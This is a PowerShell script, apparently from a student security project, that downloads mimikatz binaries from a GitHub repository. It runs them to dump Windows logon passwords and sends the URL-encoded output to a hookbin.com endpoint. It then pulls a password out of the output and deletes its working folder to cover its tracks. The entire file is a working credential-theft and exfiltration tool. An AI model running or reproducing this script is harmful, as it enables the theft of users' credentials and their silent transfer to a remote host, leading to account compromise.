#Add-Type -assembly "system.io.compression.filesystem"
Add-Type -AssemblyName System.Web

$uri_hookbin = "https://hookb.in/ZV8Od8Bd"
$repo_path = "$HOME/Desktop/ok"
$mimikatz_path = "$repo_path/mimikatz"

mkdir -p $mimikatz_path > $null 2>&1
$mimikatz_zip_path = "$repo_path/mimikatz.zip"
$mimikatz_path = "$repo_path/mimikatz"

# Downloading And extracting mimikatz
#(new-object System.net.WebClient).DownloadFile("https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20171220/mimikatz_trunk.zip", $mimikatz_path/) > $null 2>&1 
(new-object System.net.WebClient).DownloadFile("https://github.com/projetcybersecurite/ok/blob/master/mimikatz.exe?raw=true", "$mimikatz_path/mimikatz.exe") > $null 2>&1 
(new-object System.net.WebClient).DownloadFile("https://github.com/projetcybersecurite/ok/blob/master/mimilib.dll?raw=true", "$mimikatz_path/mimilib.dll") > $null 2>&1 
(new-object System.net.WebClient).DownloadFile("https://github.com/projetcybersecurite/ok/blob/master/mimidrv.sys?raw=true", "$mimikatz_path/mimidrv.sys") > $null 2>&1 
#[io.compression.zipfile]::ExtractToDirectory($mimikatz_zip_path, $mimikatz_path) > $null 2>&1 

# Executing
cd $repo_path
mimikatz/mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit" > ./output_mimikatz 
echo "DONE"
echo -n "Mimikat output is:"
cat ./output_mimikatz

# Sending output to server
$out = Get-Content ./output_mimikatz
$out_encoded  = [System.Web.HttpUtility]::UrlEncode($out)
(new-object System.net.WebClient).DownloadString("${uri_hookbin}?q=${out_encoded}") > $null 2>&1 

cat ./output_mimikatz | select -Index 33
echo "###############"
cat ./output_mimikatz | Select -Index 33 | FoReach-Object { $_.split(':')[1] }
echo "---------------"
$password = cat ./output_mimikatz | Select -Index 33 | FoReach-Object { $_.split(':')[1] }
echo "PASSWORD = $password"
$password = $password.substring(1)
echo "PASSWORD APRES SUBSTRING = $password"

echo $null > "$HOME/Desktop/$password"
# Cleaning
cd $repo_path/..
rm -rf $repo_path > $null 2>&1 
